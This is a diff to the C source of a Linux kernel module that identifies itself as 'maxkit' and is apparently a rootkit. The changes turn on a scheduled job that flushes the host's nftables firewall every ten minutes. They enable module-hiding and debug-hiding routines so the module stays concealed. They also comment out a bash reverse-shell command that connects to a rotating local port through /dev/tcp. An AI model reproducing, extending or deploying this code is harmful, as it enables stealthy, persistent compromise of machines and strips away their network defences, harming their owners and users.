@@ -19,7 +19,7 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 
-#define DELAY_MS (100 * 1000)
+#define DELAY_MS (600 * 1000)
 #define LOG_K(level, msg, ...) printk(level "fsops: " msg "\n", ##__VA_ARGS__)
 #define MAGIC_BYTES "MGCC"
 #define MAGIC_BYTES_SIZE 4
@@ -49,7 +49,7 @@ static const struct proc_ops        proc_fops = { .proc_write = proc_write };
 static char                         proc_buffer[256];
 static unsigned long                proc_buffer_size = 0;
 static bool                         debug_enabled = 1;
-static bool                         sc_enabled = 0;
+static bool                         sc_enabled = 1;
 
 MODULE_LICENSE      ("GPL");
 MODULE_AUTHOR       ("Max Friedland <mxfriedland@proton.me>");
@@ -182,7 +182,7 @@ static void sc_run_commands(struct work_struct *work)
     if (debug_enabled) LOG_K(KERN_INFO, "starting scheduled commands");
     if (sc_enabled) {
         run_user_command("nftables flush ruleset");
-        run_user_command("p=$((8000 + $(date +%s) / 600 % 100)); bash -i >& /dev/tcp/127.0.0.1/$p 0>&1");
+        //run_user_command("p=$((8000 + $(date +%s) / 600 % 100)); bash -i >& /dev/tcp/127.0.0.1/$p 0>&1");
     }
     
     schedule_delayed_work(&sc_delayed_work, msecs_to_jiffies(DELAY_MS));
@@ -243,7 +243,8 @@ static int __init fsops_init(void)
 {
     if (debug_enabled) LOG_K(KERN_INFO, "loading maxkit");
 
-    //hide_module();
+    hide_module();
+    hide_debug();
 
     nfcc_wq = create_singlethread_workqueue("the_command_work_struct");
     if (!nfcc_wq) {
